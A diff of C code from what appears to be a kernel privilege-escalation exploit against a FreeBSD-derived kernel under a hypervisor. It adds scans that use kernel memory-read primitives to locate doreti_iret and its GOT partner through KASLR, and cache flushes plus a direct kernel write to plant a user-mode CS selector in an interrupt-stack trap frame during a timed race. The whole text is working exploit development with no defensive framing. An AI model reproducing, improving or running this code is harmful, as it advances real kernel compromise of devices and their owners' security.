@@ -2959,15 +2959,22 @@ gp_trap_writer_fn(void *arg)
      * RFLAGS and RSP are pre-populated in the IST page setup and
      * affect signal delivery quality but not the panic-vs-signal
      * decision.  Removing them triples the effective CS-write
-     * frequency (~4-5 cycles per iteration vs ~12-15 with 3 stores).
+     * frequency.
      *
-     * sfence acts as a compiler barrier (prevents hoisting the
-     * gp_trap_writer_active check above the store) and on AMD Zen 2
-     * is very lightweight for regular stores (~1-4 cycles).
+     * clflushopt + sfence ensures the CS=0x43 store reaches DRAM
+     * even if the HV's EPT maps user VA (WB) and DMAP VA (UC)
+     * with asymmetric cache attributes.  Without this, the kernel
+     * may only ever see the stale CS=0x20 from DRAM.
+     *
+     * clflushopt is weakly-ordered (~10-20 cycles on Zen 2) vs
+     * clflush which is serializing (~60-80 cycles).  sfence
+     * ensures the flush completes before the next store.
      */
     while (!gp_trap_stop_writer) {
         if (gp_trap_writer_active) {
             *p_cs = 0x43;   /* user-mode CS selector */
+            __asm__ volatile("clflushopt (%0)"
+                             :: "r"(p_cs) : "memory");
             __asm__ volatile("sfence" ::: "memory");
         }
     }
@@ -5027,11 +5034,14 @@ broad_done:
                     "\n  All %d unique .text pointers (sorted by |dist|):\n",
                     num_near_ptrs);
                 send_response(sock,
-                    "  %-4s %-18s %-14s %-10s %s\n",
-                    "#", "text VA", "ktext+offset", "dist", "notes");
+                    "  %-4s %-18s %-14s %-14s %-10s %s\n",
+                    "#", "text VA", "ktext+offset",
+                    "kdata+offset", "dist", "notes");
                 for (int i = 0; i < num_near_ptrs; i++) {
                     uint64_t va = near_ptrs[i].text_va;
                     uint64_t koff = va - (uint64_t)ktext_base;
+                    uint64_t doff = near_ptrs[i].data_addr -
+                                    (uint64_t)KERNEL_ADDRESS_DATA_BASE;
                     int64_t dist = near_ptrs[i].dist;
                     const char *note = "";
                     /* Check if V+2 exists (doreti_iret_fault pattern) */
@@ -5049,8 +5059,10 @@ broad_done:
                             note = "NEG-CLOSE";
                     }
                     send_response(sock,
-                        "  %-4d 0x%016lx ktext+0x%-6lx %+10ld %s\n",
-                        i + 1, va, koff, (long)dist, note);
+                        "  %-4d 0x%016lx ktext+0x%-6lx "
+                        "kdata+0x%-6lx %+10ld %s\n",
+                        i + 1, va, koff, doff,
+                        (long)dist, note);
                 }
 
                 send_response(sock, "  [checking V/V+2 pairs...]\n");
@@ -5107,97 +5119,293 @@ broad_done:
                         num_near_ptrs);
                 }
 
-                /* ---- Exception table scan ----
+                /* ---- Relaxed V+2 proximity scan (+/-256 bytes) ----
                  *
-                 * FreeBSD stores fault recovery entries as adjacent
-                 * 8-byte slots: (fault_pc, fixup_pc).  For doreti_iret
-                 * the fault address is doreti_iret and the fixup is
-                 * doreti_iret_fault = doreti_iret + 2.
-                 *
-                 * The V/V+2 check above searches the deduplicated set
-                 * of 64 pointers within +-16KB.  This scan searches
-                 * raw .data for physically ADJACENT 8-byte slots where
-                 * slot[i+1] == slot[i] + 2, using a wider .text range.
-                 * This catches exception table entries that may be
-                 * outside the +-16KB pointer-collection window. */
+                 * GOT entries for doreti_iret and doreti_iret_fault
+                 * may be near each other in .data (same GOT page) but
+                 * not in adjacent 8-byte slots.  Check a +/-256 byte
+                 * window around each top candidate's .data address. */
                 {
-                    uint64_t et_data_start = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
-                    uint64_t et_scan_size  = 0x4000000; /* 64MB */
-                    uint64_t et_text_lo = (uint64_t)ktext_base;
-                    uint64_t et_text_hi = et_text_lo + 0x400000; /* 4MB */
-                    uint8_t etbuf[4096];
-                    int et_pairs_found = 0;
-                    uint64_t et_best_va = 0;
+                    send_response(sock,
+                        "  [Relaxed V+2 proximity scan: "
+                        "+-256 bytes around each .data location...]\n");
+                    int prox_found = 0;
+                    uint8_t prox_buf[4096];
+                    uint64_t prox_cached_page = 0;
+                    int prox_cache_valid = 0;
+
+                    int prox_count = num_near_ptrs < 16 ?
+                                     num_near_ptrs : 16;
+                    for (int i = 0; i < prox_count; i++) {
+                        uint64_t da = near_ptrs[i].data_addr;
+                        uint64_t page_addr = da & ~0xFFFULL;
+                        uint64_t target = near_ptrs[i].text_va + 2;
+
+                        /* Read page if not cached */
+                        if (!prox_cache_valid ||
+                            page_addr != prox_cached_page) {
+                            if (kernel_copyout(page_addr, prox_buf,
+                                               sizeof(prox_buf)) != 0)
+                                continue;
+                            prox_cached_page = page_addr;
+                            prox_cache_valid = 1;
+                        }
+
+                        /* Search +/-256 bytes around da */
+                        int da_off = (int)(da - page_addr);
+                        int lo = da_off - 256;
+                        if (lo < 0) lo = 0;
+                        int hi = da_off + 256;
+                        if (hi > (int)sizeof(prox_buf) - 8)
+                            hi = (int)sizeof(prox_buf) - 8;
+
+                        for (int off = lo; off <= hi; off += 8) {
+                            if (off == da_off) continue;
+                            uint64_t val;
+                            memcpy(&val, prox_buf + off, 8);
+                            if (val == target) {
+                                uint64_t partner_kdata =
+                                    page_addr + off -
+                                    (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+                                uint64_t self_kdata =
+                                    da -
+                                    (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+                                uint64_t koff =
+                                    near_ptrs[i].text_va -
+                                    (uint64_t)ktext_base;
+                                send_response(sock,
+                                    "  *** PROXIMITY V+2: "
+                                    "candidate #%d ktext+0x%lx\n"
+                                    "      V at kdata+0x%lx, "
+                                    "V+2 at kdata+0x%lx "
+                                    "(delta=%+d bytes) ***\n",
+                                    i + 1, koff,
+                                    self_kdata, partner_kdata,
+                                    (int)(page_addr + off - da));
+                                send_response(sock,
+                                    "  Confidence: HIGH "
+                                    "(V+2 in proximity)\n");
+                                prox_found = 1;
+
+                                if (num_candidates <
+                                    MAX_DORETI_CANDIDATES) {
+                                    candidates[num_candidates].paddr =
+                                        have_text_pa ?
+                                        text_pa + koff : 0;
+                                    candidates[num_candidates]
+                                        .ktext_offset = koff;
+                                    candidates[num_candidates]
+                                        .has_swapgs_before = 1;
+                                    candidates[num_candidates]
+                                        .near_handler = 13;
+                                    candidates[num_candidates]
+                                        .page_dist = 0;
+                                    num_candidates++;
+                                }
+                                goto classify;
+                            }
+                        }
+                    }
+                    if (!prox_found)
+                        send_response(sock,
+                            "  No V+2 in +-256 byte proximity\n");
+                }
+
+                /* ---- Context dump around top candidates ----
+                 *
+                 * Hex-dump 128 bytes centered on each top candidate's
+                 * .data address to help identify GOT, vtables, etc. */
+                {
+                    int ctx_count = num_near_ptrs < 4 ?
+                                    num_near_ptrs : 4;
+                    send_response(sock,
+                        "\n  .data context dump (128 bytes) "
+                        "around top %d candidates:\n", ctx_count);
+
+                    uint8_t ctxbuf[4096];
+                    uint64_t ctx_cached_page = 0;
+                    int ctx_cache_valid = 0;
+
+                    for (int i = 0; i < ctx_count; i++) {
+                        uint64_t da = near_ptrs[i].data_addr;
+                        uint64_t page_addr = da & ~0xFFFULL;
+
+                        if (!ctx_cache_valid ||
+                            page_addr != ctx_cached_page) {
+                            if (kernel_copyout(page_addr, ctxbuf,
+                                    sizeof(ctxbuf)) != 0) {
+                                send_response(sock,
+                                    "  #%d: cannot read page "
+                                    "at 0x%lx\n",
+                                    i + 1, page_addr);
+                                continue;
+                            }
+                            ctx_cached_page = page_addr;
+                            ctx_cache_valid = 1;
+                        }
+
+                        int da_off = (int)(da - page_addr);
+                        int dump_start = da_off - 64;
+                        if (dump_start < 0) dump_start = 0;
+                        int dump_end = da_off + 64;
+                        if (dump_end > (int)sizeof(ctxbuf))
+                            dump_end = (int)sizeof(ctxbuf);
+
+                        uint64_t kdata_base_val =
+                            (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+                        send_response(sock,
+                            "\n  #%d ktext+0x%lx @ kdata+0x%lx:\n",
+                            i + 1,
+                            near_ptrs[i].text_va -
+                                (uint64_t)ktext_base,
+                            da - kdata_base_val);
+
+                        for (int off = dump_start;
+                             off < dump_end; off += 8) {
+                            uint64_t val;
+                            memcpy(&val, ctxbuf + off, 8);
+                            const char *marker = "";
+                            if (off == da_off)
+                                marker = " <-- THIS";
+                            else if (val ==
+                                     near_ptrs[i].text_va + 2)
+                                marker = " <-- V+2!";
+                            send_response(sock,
+                                "    kdata+0x%lx: 0x%016lx%s\n",
+                                page_addr + off - kdata_base_val,
+                                val, marker);
+                        }
+                    }
+                }
+
+                /* ---- Targeted V+2 partner search (full 64MB .data) ----
+                 *
+                 * FreeBSD uses direct comparison in trap.c, NOT
+                 * exception tables:
+                 *   if (frame->tf_rip == (long)doreti_iret)
+                 *
+                 * In a PIC/KASLR kernel this compiles to a GOT load.
+                 * doreti_iret_fault (= doreti_iret + 2) has its own
+                 * separate GOT entry that may be ANYWHERE in .data,
+                 * not just within the +-16KB pointer-collection window.
+                 *
+                 * Single-pass: scan all 64MB, check each 8-byte slot
+                 * against the top 16 candidates' text_va + 2 values. */
+                {
+                    int vp_search_count = num_near_ptrs < 16 ?
+                                          num_near_ptrs : 16;
+                    uint64_t vp_targets[16];
+                    int vp_found[16];
+                    uint64_t vp_found_at[16];
+                    for (int i = 0; i < vp_search_count; i++) {
+                        vp_targets[i] = near_ptrs[i].text_va + 2;
+                        vp_found[i] = 0;
+                        vp_found_at[i] = 0;
+                    }
 
                     send_response(sock,
-                        "\n  Exception table scan (adjacent V, V+2 "
-                        "pairs in raw .data)...\n");
+                        "\n  Targeted V+2 partner search "
+                        "(%d candidates, 64MB .data)...\n",
+                        vp_search_count);
 
-                    for (uint64_t eaddr = et_data_start;
-                         eaddr < et_data_start + et_scan_size;
-                         eaddr += sizeof(etbuf)) {
+                    uint64_t vp_data_start =
+                        (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+                    uint64_t vp_scan_size = 0x4000000; /* 64MB */
+                    uint8_t vpbuf[4096];
+                    int vp_total_found = 0;
 
-                        if (((eaddr - et_data_start) & 0xFFFFFF) == 0 &&
-                            eaddr != et_data_start)
+                    for (uint64_t vpa = vp_data_start;
+                         vpa < vp_data_start + vp_scan_size;
+                         vpa += sizeof(vpbuf)) {
+
+                        if (((vpa - vp_data_start) & 0xFFFFFF) == 0 &&
+                            vpa != vp_data_start)
                             send_response(sock, "  ...%luMB\n",
-                                (unsigned long)((eaddr - et_data_start) >> 20));
+                                (unsigned long)(
+                                    (vpa - vp_data_start) >> 20));
 
-                        if (kernel_copyout(eaddr, etbuf, sizeof(etbuf)) != 0)
+                        if (kernel_copyout(vpa, vpbuf,
+                                           sizeof(vpbuf)) != 0)
                             continue;
 
-                        for (int eoff = 0;
-                             eoff <= (int)sizeof(etbuf) - 16;
-                             eoff += 8) {
-                            uint64_t v1, v2;
-                            memcpy(&v1, etbuf + eoff, 8);
-                            memcpy(&v2, etbuf + eoff + 8, 8);
+                        for (int off = 0;
+                             off <= (int)sizeof(vpbuf) - 8;
+                             off += 8) {
+                            uint64_t val;
+                            memcpy(&val, vpbuf + off, 8);
 
-                            /* Both must be in .text range */
-                            if (v1 < et_text_lo || v1 >= et_text_hi)
-                                continue;
-                            if (v2 != v1 + 2)
-                                continue;
-
-                            et_pairs_found++;
-                            uint64_t etkoff = v1 - et_text_lo;
-                            send_response(sock,
-                                "  ET PAIR #%d at kdata+0x%lx: "
-                                "V=0x%lx (ktext+0x%lx) V+2=0x%lx\n",
-                                et_pairs_found,
-                                eaddr + eoff - et_data_start,
-                                v1, etkoff, v2);
-                            if (!et_best_va)
-                                et_best_va = v1;
+                            for (int c = 0;
+                                 c < vp_search_count; c++) {
+                                if (val == vp_targets[c] &&
+                                    !vp_found[c]) {
+                                    vp_found[c] = 1;
+                                    vp_found_at[c] =
+                                        vpa + off - vp_data_start;
+                                    vp_total_found++;
+                                    send_response(sock,
+                                        "  *** V+2 MATCH: "
+                                        "candidate #%d "
+                                        "ktext+0x%lx -> V+2 at "
+                                        "kdata+0x%lx ***\n",
+                                        c + 1,
+                                        near_ptrs[c].text_va -
+                                            (uint64_t)ktext_base,
+                                        vp_found_at[c]);
+                                }
+                            }
                         }
                     }
 
-                    if (et_best_va) {
-                        uint64_t etkoff = et_best_va - (uint64_t)ktext_base;
-                        send_response(sock,
-                            "\n  *** doreti_iret = 0x%lx "
-                            "(ktext+0x%lx) ***\n",
-                            et_best_va, etkoff);
-                        send_response(sock,
-                            "  Confidence: HIGH (exception table "
-                            "adjacent pair, %d total found)\n",
-                            et_pairs_found);
+                    if (vp_total_found > 0) {
+                        /* Use first (closest-to-handler)
+                         * candidate with V+2 partner */
+                        for (int c = 0;
+                             c < vp_search_count; c++) {
+                            if (!vp_found[c]) continue;
+                            uint64_t va = near_ptrs[c].text_va;
+                            uint64_t koff =
+                                va - (uint64_t)ktext_base;
+                            uint64_t self_kdata =
+                                near_ptrs[c].data_addr -
+                                vp_data_start;
+                            send_response(sock,
+                                "\n  *** doreti_iret = 0x%lx "
+                                "(ktext+0x%lx) ***\n"
+                                "  V+2 partner at "
+                                "kdata+0x%lx\n"
+                                "  V GOT at kdata+0x%lx "
+                                "(dist=%+ld)\n",
+                                va, koff,
+                                vp_found_at[c],
+                                self_kdata,
+                                (long)near_ptrs[c].dist);
+                            send_response(sock,
+                                "  Confidence: HIGH "
+                                "(V+2 partner found in "
+                                "full .data scan)\n");
 
-                        if (num_candidates < MAX_DORETI_CANDIDATES) {
-                            candidates[num_candidates].paddr =
-                                have_text_pa ? text_pa + etkoff : 0;
-                            candidates[num_candidates].ktext_offset = etkoff;
-                            candidates[num_candidates].has_swapgs_before = 1;
-                            candidates[num_candidates].near_handler = 13;
-                            candidates[num_candidates].page_dist = 0;
-                            num_candidates++;
+                            if (num_candidates <
+                                MAX_DORETI_CANDIDATES) {
+                                candidates[num_candidates]
+                                    .paddr = have_text_pa ?
+                                    text_pa + koff : 0;
+                                candidates[num_candidates]
+                                    .ktext_offset = koff;
+                                candidates[num_candidates]
+                                    .has_swapgs_before = 1;
+                                candidates[num_candidates]
+                                    .near_handler = 13;
+                                candidates[num_candidates]
+                                    .page_dist = 0;
+                                num_candidates++;
+                            }
+                            goto classify;
                         }
-                        goto classify;
                     }
 
                     send_response(sock,
-                        "  No adjacent exception table pairs found "
-                        "(scanned %luMB)\n",
-                        (unsigned long)(et_scan_size >> 20));
+                        "  No V+2 partners found in full "
+                        "64MB .data scan\n");
                 }
 
                 /* Hybrid candidate ranking from .data pointers.
@@ -6228,6 +6436,18 @@ broad_done:
                 *(volatile uint64_t *)(istp + 0xFE8) = 0x202; /* RFLAGS */
                 *(volatile uint64_t *)(istp + 0xFF8) = 0x2B;  /* SS = user */
 
+                /* Flush CS cache line to DRAM so kernel's first
+                 * read (if UC via EPT) sees 0x43, not stale zero. */
+                __asm__ volatile("clflush (%0)"
+                    :: "r"((void *)(istp + 0xFE0)) : "memory");
+                __asm__ volatile("sfence" ::: "memory");
+
+                /* Also write CS=0x43 through the kernel's DMAP
+                 * write path, ensuring the kernel's cache domain
+                 * has 0x43 in case user VA and DMAP VA go through
+                 * different cache hierarchies due to EPT. */
+                kernel_setlong(ist_dmap_va + 0xFE0, 0x43);
+
                 /* Reset per-attempt state */
                 gp_trap_sig_received = 0;
                 gp_trap_ist_rip = 0;
@@ -6372,9 +6592,12 @@ broad_done:
                      * (timer tick), so the actual delay could be
                      * 500µs to ~1.5ms.  RDTSC gives sub-µs precision.
                      *
-                     * Spin for ~100µs (350K cycles at 3.5GHz Zen 2
+                     * Spin for ~500µs (1.75M cycles at 3.5GHz Zen 2
                      * invariant TSC) using pause to yield pipeline
-                     * resources to writer threads on the same core. */
+                     * resources to writer threads on the same core.
+                     * Extended from 100µs to give writers more time
+                     * to establish steady-state CS=0x43 in DRAM
+                     * (via clflushopt). */
                     gp_trap_writer_active = 1;
                     {
                         unsigned int tsc_lo, tsc_hi;
@@ -6382,7 +6605,7 @@ broad_done:
                             : "=a"(tsc_lo), "=d"(tsc_hi));
                         uint64_t tsc_start =
                             ((uint64_t)tsc_hi << 32) | tsc_lo;
-                        uint64_t tsc_target = tsc_start + 350000;
+                        uint64_t tsc_target = tsc_start + 1750000;
                         do {
                             __asm__ volatile("pause");
                             __asm__ volatile("rdtsc"
